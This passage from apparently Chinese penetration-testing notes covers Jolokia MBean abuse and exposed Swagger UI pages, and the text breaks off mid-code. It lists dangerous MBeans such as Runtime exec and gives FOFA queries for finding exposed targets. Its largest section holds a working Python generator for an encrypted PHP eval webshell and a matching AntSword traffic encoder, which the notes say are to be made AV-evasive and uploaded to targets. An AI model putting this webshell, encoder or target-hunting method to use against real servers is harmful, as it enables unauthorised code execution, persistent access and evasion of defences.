  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">curl -X POST http:<span class="comment">//localhost:8080/jolokia/ \</span></span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;type&quot;: &quot;read&quot;,</span></span><br><span class="line"><span class="string">    &quot;mbean&quot;: &quot;com.example.order:type=CreateMonitor,module=order-service,version=2.1&quot;,</span></span><br><span class="line"><span class="string">    &quot;attribute&quot;: &quot;CreateCount&quot;</span></span><br><span class="line"><span class="string">  &#125;&#x27;</span></span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  &quot;mbean&quot;: &quot;com.example.order:type=CreateMonitor,module=order-service,version=2.1&quot;  理解为new OrderCreateMonitor()这个实例</span></span><br><span class="line"><span class="comment">  &quot;type&quot;: &quot;read&quot;  理解为调用这个实例中的getter方法</span></span><br><span class="line"><span class="comment">  &quot;attribute&quot;: &quot;CreateCount&quot;  表示getter哪一个</span></span><br><span class="line"><span class="comment">  这三部分结合起来就是：new OrderCreateMonitor().getCreateCount()</span></span><br><span class="line"><span class="comment">  </span></span><br><span class="line"><span class="comment">**/</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>调用订单支付监控 MBean（获取今日支付总金额）</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">curl -X POST http:<span class="comment">//localhost:8080/jolokia/ \</span></span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;type&quot;: &quot;read&quot;,</span></span><br><span class="line"><span class="string">    &quot;mbean&quot;: &quot;com.example.order:type=PaymentMonitor,module=payment-service,version=2.1&quot;,</span></span><br><span class="line"><span class="string">    &quot;attribute&quot;: &quot;TotalAmount&quot;</span></span><br><span class="line"><span class="string">  &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>批量获取多个 MBean 属性</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">curl -X POST http:<span class="comment">//localhost:8080/jolokia/ \</span></span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;[</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      &quot;type&quot;: &quot;read&quot;,</span></span><br><span class="line"><span class="string">      &quot;mbean&quot;: &quot;com.example.order:type=CreateMonitor,module=order-service,version=2.1&quot;,</span></span><br><span class="line"><span class="string">      &quot;attribute&quot;: &quot;CreateCount&quot;,</span></span><br><span class="line"><span class="string">      &quot;id&quot;: &quot;1&quot;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      &quot;type&quot;: &quot;read&quot;,</span></span><br><span class="line"><span class="string">      &quot;mbean&quot;: &quot;com.example.order:type=DeliveryMonitor,module=logistics-service,version=2.1&quot;,</span></span><br><span class="line"><span class="string">      &quot;attribute&quot;: &quot;ShippedCount&quot;,</span></span><br><span class="line"><span class="string">      &quot;id&quot;: &quot;2&quot;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  ]&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>POST访问jolokia api请求体格式解析</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">type：操作类型（必选），常见值为read（读属性）、write（写属性）、exec（调用方法）</span><br><span class="line">mbean：MBean 的全名（必选），格式为域名:键=值[,键=值]（如java.lang:type=Memory）</span><br><span class="line">attribute：属性名（读/写属性时必选），支持单个属性（字符串）或多个属性（数组）</span><br><span class="line">value：属性值（写属性时必选），需与属性类型匹配（如数字、字符串、布尔值）</span><br><span class="line">operation：方法名（调用方法时必选）</span><br><span class="line">arguments：方法参数（调用带参方法时必选），数组形式，顺序与方法参数一致</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>内置的一些高危MBean命令，怎么通过jolokia api调用，用的时候问AI</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. javax.management.loading:type=DefaultLoaderRepository</span><br><span class="line">    危险操作：loadClass 或 loadClassWithoutBind 方法</span><br><span class="line">    作用：加载外部类字节码到 JVM。</span><br><span class="line">    风险：若攻击者可控类字节码（如包含恶意静态代码块或方法），可执行任意代码（如命令执行、文件读写）。</span><br><span class="line">2. com.sun.management:type=DiagnosticCommand</span><br><span class="line">    危险操作：vmCommand 或具体命令方法（如 execute）</span><br><span class="line">    作用：执行 JVM 诊断命令（如 jmap、jstack 等效功能）。</span><br><span class="line">    风险：部分命令可读取进程内存、线程信息，甚至在特定 JDK 版本中通过参数注入执行系统命令。</span><br><span class="line">3. java.lang:type=Runtime</span><br><span class="line">    危险操作：exec(String command) 方法</span><br><span class="line">    作用：直接执行系统命令（如 ls、rm、bash 等）。</span><br><span class="line">    风险：最直接的命令执行入口，若可调用，攻击者可完全控制服务器。</span><br><span class="line">4. java.nio:type=FileSystem（部分 JDK 实现）</span><br><span class="line">    危险操作：createFile、deleteFile、write 等文件操作方法</span><br><span class="line">    风险：读写 / 删除服务器任意文件（如 /etc/passwd、应用配置文件）。</span><br><span class="line">5. java.lang:type=ClassLoading</span><br><span class="line">    危险操作：setClassPath 方法</span><br><span class="line">    作用：修改 JVM 类加载路径。</span><br><span class="line">    风险：加载恶意 JAR 包，触发代码执行。</span><br><span class="line">6. Tomcat：Catalina:type=Manager</span><br><span class="line">	危险操作：listSession（获取会话信息）、expireSession（销毁会话），结合其他漏洞可越权。</span><br><span class="line">7. Spring Boot：org.springframework.boot:type=Admin,name=SpringApplication</span><br><span class="line">	危险操作：shutdown 方法（直接关闭应用）。</span><br><span class="line">8. JBoss/Wildfly：jboss.system:type=ServerInfo</span><br><span class="line">	危险操作：listDeployments 结合部署接口可上传恶意 WAR 包。</span><br></pre></td></tr></table></figure>
</li>
<li><p>资产定位</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">body=&quot;\&quot;request\&quot;:&#123;\&quot;mbean\&quot;&quot; || body=&quot;\&quot;status\&quot;:200&quot; &amp;&amp; body=&quot;jolokia&quot;</span><br><span class="line">header=&quot;X-Jolokia-Version&quot; || (header=&quot;Content-Type: application/json&quot; &amp;&amp; body=&quot;/jolokia&quot;)</span><br><span class="line">body=&quot;\&quot;error_type\&quot;:\&quot;javax.management\&quot;&quot; &amp;&amp; body=&quot;/jolokia&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用工具：<a href="https://github.com/laluka/jolokia-exploitation-toolkit">https://github.com/laluka/jolokia-exploitation-toolkit</a></p>
</li>
</ol>
<h3 id="产品漏洞"><a href="#产品漏洞" class="headerlink" title="产品漏洞"></a>产品漏洞</h3><h4 id="OpenApi"><a href="#OpenApi" class="headerlink" title="OpenApi"></a>OpenApi</h4><ol>
<li><p>OpenApi是一套用来介绍和简单测试网站中使用到的api的规范，很多的后端框架都遵循这套规范开发出了自己api测试&#x2F;说明的小工具，比如SpringBoot的SpringDoc、DRF（Django Rest Framework）的drf-spectacular、Flask的flask-restx和flask-openapi3、NodeJs的swagger-jsdoc等等。并且，OpenApi官方还默认提供了一个前端页面，用来在线浏览和测试api接口，很多实现OpenApi的工具默认都采用这个页面，如下图所示。一般来说，实现OpenApi的工具&#x2F;服务本身没有什么漏洞（功能比较单一），但是该页面&#x2F;接口地址不应当被公开（未授权访问），需要认证后才能访问，否则很容易泄露一些敏感的、有漏洞的api接口。</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110133414687.png" alt="image-20251110133414687"></p>
</li>
<li><p>OpenApi规范最开始叫做swagger，从2.0版本（2014年）开始正式更名为OpenApi。如上面所讲，不同框架都有自己实现OpenApi规范的小组件，但基本上都默认采用OpenApi官方给出的页面作为测试界面，所以可以通过fofa批量查找这个页面：title&#x3D;”Swagger UI”</p>
</li>
<li><p>如果已经未授权访问到了swagger ui界面，那么可以批量测试其中的api，因为这是一个通用的规范，所以不管你的后端是java还是golang或者其他语言，只要按照这个标准实现了SwaggerUI中的功能，且泄露了这个页面，就会成为其他漏洞挖掘&amp;利用的一个起点：接口文档地址（一般在swagger ui界面上会有提示，改地址以纯文本的形式返回所有的api接口）&#x3D;&#x3D;&gt; postman&#x2F;apifox &#x3D;&#x3D;&gt; BurpSuite &#x3D;&#x3D;&gt; Xray。</p>
</li>
</ol>
<h3 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h3><h2 id="Webshell免杀"><a href="#Webshell免杀" class="headerlink" title="Webshell免杀"></a>Webshell免杀</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><ol>
<li><p>流量免杀</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_id</span>(<span class="params">length: <span class="built_in">int</span> = <span class="number">8</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;_0x<span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(random.choices(string.hexdigits.lower(), k=length))&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key</span>(<span class="params">pwd: <span class="built_in">str</span>, algorithm: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;根据算法生成符合长度的密钥&quot;&quot;&quot;</span></span><br><span class="line">    key_length_map = &#123;</span><br><span class="line">        <span class="string">&#x27;aes-128-cbc&#x27;</span>: <span class="number">16</span>,</span><br><span class="line">        <span class="string">&#x27;aes-192-cbc&#x27;</span>: <span class="number">24</span>,</span><br><span class="line">        <span class="string">&#x27;aes-256-cbc&#x27;</span>: <span class="number">32</span></span><br><span class="line">    &#125;</span><br><span class="line">    key_length = key_length_map[algorithm]</span><br><span class="line">    </span><br><span class="line">    salt = os.urandom(<span class="number">16</span>)</span><br><span class="line">    iterations = <span class="number">100000</span></span><br><span class="line">    key = PBKDF2(pwd.encode(<span class="string">&#x27;utf-8&#x27;</span>), salt, dkLen=key_length, count=iterations)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> key.<span class="built_in">hex</span>(), salt.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_scripts</span>(<span class="params">args</span>):</span><br><span class="line">    key_hex, salt_hex = generate_key(args.pwd, args.algorithm)</span><br><span class="line">    random_id = generate_random_id()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解析算法位数（修复除法错误）</span></span><br><span class="line">    algo_bits = <span class="built_in">int</span>(args.algorithm.split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">1</span>])  <span class="comment"># 提取128/192/256并转为整数</span></span><br><span class="line">    key_byte_length = algo_bits // <span class="number">8</span>  <span class="comment"># 计算字节长度（128/8=16）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 前端JavaScript脚本</span></span><br><span class="line">    frontend_content = <span class="string">f&#x27;&#x27;&#x27;/**</span></span><br><span class="line"><span class="string"> * 前端AES加密脚本（修复密钥长度）</span></span><br><span class="line"><span class="string"> * 密码：<span class="subst">&#123;args.pwd&#125;</span> | 算法：<span class="subst">&#123;args.algorithm&#125;</span></span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">&#x27;use strict&#x27;;</span></span><br><span class="line"><span class="string">const crypto = require(&#x27;crypto&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">module.exports = (pwd, data, ext = &#123;&#123;&#125;&#125;) =&gt; &#123;&#123;</span></span><br><span class="line"><span class="string">    const algorithm = &#x27;<span class="subst">&#123;args.algorithm&#125;</span>&#x27;;</span></span><br><span class="line"><span class="string">    const salt = Buffer.from(&#x27;<span class="subst">&#123;salt_hex&#125;</span>&#x27;, &#x27;hex&#x27;);</span></span><br><span class="line"><span class="string">    // 派生符合长度的密钥</span></span><br><span class="line"><span class="string">    const key = crypto.pbkdf2Sync(pwd, salt, 100000, <span class="subst">&#123;algo_bits / <span class="number">8</span>&#125;</span>, &#x27;sha256&#x27;);</span></span><br><span class="line"><span class="string">    const iv = crypto.randomBytes(16);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    const randomID = &quot;<span class="subst">&#123;random_id&#125;</span>&quot;;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    // 加密原始payload</span></span><br><span class="line"><span class="string">    const originalPayload = data[&#x27;_&#x27;];</span></span><br><span class="line"><span class="string">    const cipherPayload = crypto.createCipheriv(algorithm, key, iv);</span></span><br><span class="line"><span class="string">    let encryptedPayload = cipherPayload.update(originalPayload, &#x27;utf8&#x27;, &#x27;base64&#x27;);</span></span><br><span class="line"><span class="string">    encryptedPayload += cipherPayload.final(&#x27;base64&#x27;);</span></span><br><span class="line"><span class="string">    data[randomID] = `$&#123;&#123;encryptedPayload&#125;&#125;|$&#123;&#123;iv.toString(&#x27;base64&#x27;)&#125;&#125;`;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    // 后端执行代码</span></span><br><span class="line"><span class="string">    const execCode = `</span></span><br><span class="line"><span class="string">        $data = explode(&#x27;|&#x27;, $_POST[&#x27;<span class="subst">&#123;random_id&#125;</span>&#x27;]);</span></span><br><span class="line"><span class="string">        $encrypted = base64_decode($data[0]);</span></span><br><span class="line"><span class="string">        $iv = base64_decode($data[1]);</span></span><br><span class="line"><span class="string">        $salt = hex2bin(&#x27;<span class="subst">&#123;salt_hex&#125;</span>&#x27;);</span></span><br><span class="line"><span class="string">        $key = hash_pbkdf2(</span></span><br><span class="line"><span class="string">            &#x27;sha256&#x27;, </span></span><br><span class="line"><span class="string">            &#x27;<span class="subst">&#123;args.pwd&#125;</span>&#x27;, </span></span><br><span class="line"><span class="string">            $salt, </span></span><br><span class="line"><span class="string">            100000, </span></span><br><span class="line"><span class="string">            <span class="subst">&#123;key_byte_length&#125;</span>, </span></span><br><span class="line"><span class="string">            true</span></span><br><span class="line"><span class="string">        );</span></span><br><span class="line"><span class="string">        $decrypted = openssl_decrypt(</span></span><br><span class="line"><span class="string">            $encrypted, </span></span><br><span class="line"><span class="string">            &#x27;<span class="subst">&#123;args.algorithm&#125;</span>&#x27;, </span></span><br><span class="line"><span class="string">            $key, </span></span><br><span class="line"><span class="string">            OPENSSL_RAW_DATA, </span></span><br><span class="line"><span class="string">            $iv</span></span><br><span class="line"><span class="string">        );</span></span><br><span class="line"><span class="string">        eval($decrypted);</span></span><br><span class="line"><span class="string">    `.replace(/\s+/g, &#x27; &#x27;).trim();</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    // 加密执行代码</span></span><br><span class="line"><span class="string">    const cipherPwd = crypto.createCipheriv(algorithm, key, iv);</span></span><br><span class="line"><span class="string">    let encryptedPwd = cipherPwd.update(execCode, &#x27;utf8&#x27;, &#x27;base64&#x27;);</span></span><br><span class="line"><span class="string">    encryptedPwd += cipherPwd.final(&#x27;base64&#x27;);</span></span><br><span class="line"><span class="string">    data[pwd] = `$&#123;&#123;encryptedPwd&#125;&#125;|$&#123;&#123;iv.toString(&#x27;base64&#x27;)&#125;&#125;`;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    delete data[&#x27;_&#x27;];</span></span><br><span class="line"><span class="string">    return data;</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 后端PHP脚本</span></span><br><span class="line">    backend_content = <span class="string">f&#x27;&#x27;&#x27;&lt;?php</span></span><br><span class="line"><span class="string">/**</span></span><br><span class="line"><span class="string"> * 后端AES解密脚本（修复密钥长度）</span></span><br><span class="line"><span class="string"> * 密码：<span class="subst">&#123;args.pwd&#125;</span> | 算法：<span class="subst">&#123;args.algorithm&#125;</span></span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$encryptedData = $_POST[&#x27;<span class="subst">&#123;args.pwd&#125;</span>&#x27;] ?? &#x27;&#x27;;</span></span><br><span class="line"><span class="string">if (empty($encryptedData)) &#123;&#123;</span></span><br><span class="line"><span class="string">    exit(&#x27;Missing parameter: <span class="subst">&#123;args.pwd&#125;</span>&#x27;);</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">list($encryptedPwd64, $ivB64) = explode(&#x27;|&#x27;, $encryptedData, 2);</span></span><br><span class="line"><span class="string">if (empty($encryptedPwd64) || empty($ivB64)) &#123;&#123;</span></span><br><span class="line"><span class="string">    exit(&quot;Parameter&#x27;s format is failed!&quot;);</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$encryptedPwd = base64_decode($encryptedPwd64);</span></span><br><span class="line"><span class="string">$iv = base64_decode($ivB64);</span></span><br><span class="line"><span class="string">$salt = hex2bin(&#x27;<span class="subst">&#123;salt_hex&#125;</span>&#x27;);</span></span><br><span class="line"><span class="string">$key = hash_pbkdf2(</span></span><br><span class="line"><span class="string">    &#x27;sha256&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;<span class="subst">&#123;args.pwd&#125;</span>&#x27;, </span></span><br><span class="line"><span class="string">    $salt, </span></span><br><span class="line"><span class="string">    100000, </span></span><br><span class="line"><span class="string">    <span class="subst">&#123;key_byte_length&#125;</span>, </span></span><br><span class="line"><span class="string">    true</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$decryptedCode = openssl_decrypt(</span></span><br><span class="line"><span class="string">    $encryptedPwd,</span></span><br><span class="line"><span class="string">    &#x27;<span class="subst">&#123;args.algorithm&#125;</span>&#x27;,</span></span><br><span class="line"><span class="string">    $key,</span></span><br><span class="line"><span class="string">    OPENSSL_RAW_DATA,</span></span><br><span class="line"><span class="string">    $iv</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string">if ($decryptedCode === false) &#123;&#123;</span></span><br><span class="line"><span class="string">    exit(&#x27;Decription is failed!&#x27;);</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">eval($decryptedCode);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    os.makedirs(args.output_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    frontend_path = os.path.join(args.output_dir, <span class="string">&#x27;frontend_encrypt.js&#x27;</span>)</span><br><span class="line">    backend_path = os.path.join(args.output_dir, <span class="string">&#x27;backend_decrypt.php&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(frontend_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(frontend_content)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(backend_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(backend_content)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;✅ 脚本生成成功！&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;前端脚本：<span class="subst">&#123;frontend_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;后端脚本：<span class="subst">&#123;backend_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;算法：<span class="subst">&#123;args.algorithm&#125;</span>（密钥长度正确）&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;AES脚本生成器（修复密钥长度问题）&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--pwd&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;同步密码（如anonymous）&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--output-dir&#x27;</span>, default=<span class="string">&#x27;./generated_scripts&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;输出目录&#x27;</span>)</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&#x27;--algorithm&#x27;</span>, </span><br><span class="line">        default=<span class="string">&#x27;aes-256-cbc&#x27;</span>, </span><br><span class="line">        choices=[<span class="string">&#x27;aes-128-cbc&#x27;</span>, <span class="string">&#x27;aes-192-cbc&#x27;</span>, <span class="string">&#x27;aes-256-cbc&#x27;</span>],</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&#x27;AES算法（默认aes-256-cbc）&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    generate_scripts(args)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

 <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">frontend_encrypt.js: 蚁剑的编码器，用于加密蚁剑流量中的参数，新增到蚁剑的编码器中，创建目标时选择这个</span><br><span class="line">backend_decrypt.php: webshell，接收、解密、执行蚁剑的指令，不免杀，做免杀后上传到靶标中</span><br></pre></td></tr></table></figure>

 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Tuple</span>, <span class="type">Dict</span>, <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_algorithm_info</span>(<span class="params">algorithm: <span class="built_in">str</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;获取算法对应的默认密钥长度和向量长度&quot;&quot;&quot;</span></span><br><span class="line">    algo_info = &#123;</span><br><span class="line">        <span class="comment"># 算法: (密钥长度字节, 向量长度字节)</span></span><br><span class="line">        <span class="string">&quot;aes-128-cbc&quot;</span>: (<span class="number">16</span>, <span class="number">16</span>),</span><br><span class="line">        <span class="string">&quot;aes-192-cbc&quot;</span>: (<span class="number">24</span>, <span class="number">16</span>),</span><br><span class="line">        <span class="string">&quot;aes-256-cbc&quot;</span>: (<span class="number">32</span>, <span class="number">16</span>),</span><br><span class="line">        <span class="string">&quot;aes-128-gcm&quot;</span>: (<span class="number">16</span>, <span class="number">12</span>),</span><br><span class="line">        <span class="string">&quot;aes-192-gcm&quot;</span>: (<span class="number">24</span>, <span class="number">12</span>),</span><br><span class="line">        <span class="string">&quot;aes-256-gcm&quot;</span>: (<span class="number">32</span>, <span class="number">12</span>),</span><br><span class="line">        <span class="string">&quot;des-ede3-cbc&quot;</span>: (<span class="number">24</span>, <span class="number">8</span>),  <span class="comment"># 3DES</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> algorithm <span class="keyword">not</span> <span class="keyword">in</span> algo_info:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;不支持的算法: <span class="subst">&#123;algorithm&#125;</span>，支持的算法: <span class="subst">&#123;<span class="built_in">list</span>(algo_info.keys())&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> algo_info[algorithm]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_key</span>(<span class="params">length: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;生成指定长度的随机密钥（包含特殊字符）&quot;&quot;&quot;</span></span><br><span class="line">    chars = string.ascii_letters + string.digits + <span class="string">&#x27;!@#$%^&amp;*()_+-=[]&#123;&#125;|;:,.&lt;&gt;?`~&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choice(chars) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_encryption_script</span>(<span class="params"></span></span><br><span class="line"><span class="params">    algorithm: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    key: <span class="type">Optional</span>[<span class="built_in">str</span>],</span></span><br><span class="line"><span class="params">    iv: <span class="type">Optional</span>[<span class="built_in">str</span>],</span></span><br><span class="line"><span class="params">    key_length: <span class="type">Optional</span>[<span class="built_in">int</span>],</span></span><br><span class="line"><span class="params">    iv_length: <span class="type">Optional</span>[<span class="built_in">int</span>],</span></span><br><span class="line"><span class="params">    encode_final: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    output_file: <span class="built_in">str</span></span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;生成加密解密脚本&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 获取算法默认参数</span></span><br><span class="line">    default_key_len, default_iv_len = get_algorithm_info(algorithm)</span><br><span class="line">    key_length = key_length <span class="keyword">or</span> default_key_len</span><br><span class="line">    iv_length = iv_length <span class="keyword">or</span> default_iv_len</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 处理密钥</span></span><br><span class="line">    <span class="keyword">if</span> key:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(key) != key_length:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;密钥长度必须为 <span class="subst">&#123;key_length&#125;</span> 字节，当前为 <span class="subst">&#123;<span class="built_in">len</span>(key)&#125;</span> 字节&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key = generate_random_key(key_length)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 处理向量</span></span><br><span class="line">    <span class="keyword">if</span> iv:</span><br><span class="line">        <span class="comment"># 向量以十六进制字符串传入，需验证原始字节长度</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(iv) != iv_length * <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;向量十六进制字符串长度必须为 <span class="subst">&#123;iv_length*<span class="number">2</span>&#125;</span>，当前为 <span class="subst">&#123;<span class="built_in">len</span>(iv)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 生成随机向量（十六进制字符串）</span></span><br><span class="line">        iv = os.urandom(iv_length).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成PHP加密函数（处理换行和空格）</span></span><br><span class="line">    php_encrypt = <span class="string">f&quot;&quot;&quot;function asenc($out) &#123;&#123;</span></span><br><span class="line"><span class="string">        $key = &#x27;<span class="subst">&#123;key&#125;</span>&#x27;;</span></span><br><span class="line"><span class="string">        $iv = hex2bin(&#x27;<span class="subst">&#123;iv&#125;</span>&#x27;);</span></span><br><span class="line"><span class="string">        $blockSize = openssl_cipher_iv_length(&#x27;<span class="subst">&#123;algorithm&#125;</span>&#x27;);</span></span><br><span class="line"><span class="string">        $pad = $blockSize - (strlen($out) % $blockSize);</span></span><br><span class="line"><span class="string">        $out .= str_repeat(chr($pad), $pad);</span></span><br><span class="line"><span class="string">        $encrypted = openssl_encrypt($out, &#x27;<span class="subst">&#123;algorithm&#125;</span>&#x27;, $key, OPENSSL_RAW_DATA, $iv);</span></span><br><span class="line"><span class="string">        return <span class="subst">&#123;encode_final&#125;</span>_encode($encrypted);</span></span><br><span class="line"><span class="string">    &#125;&#125;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 手动处理PHP函数的空格和换行（避免使用正则在f-string中冲突）</span></span><br><span class="line">    php_encrypt_clean = <span class="string">&#x27; &#x27;</span>.join(php_encrypt.split())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成JavaScript脚本（使用常规字符串拼接避免f-string冲突）</span></span><br><span class="line">    js_script = <span class="string">&#x27;&#x27;&#x27;&#x27;use strict&#x27;;</span></span><br><span class="line"><span class="string">const crypto = require(&#x27;crypto&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 加密配置: &#123;algorithm&#125; | 密钥长度: &#123;key_length&#125;字节 | 向量长度: &#123;iv_length&#125;字节</span></span><br><span class="line"><span class="string">const ENCRYPTION_KEY = 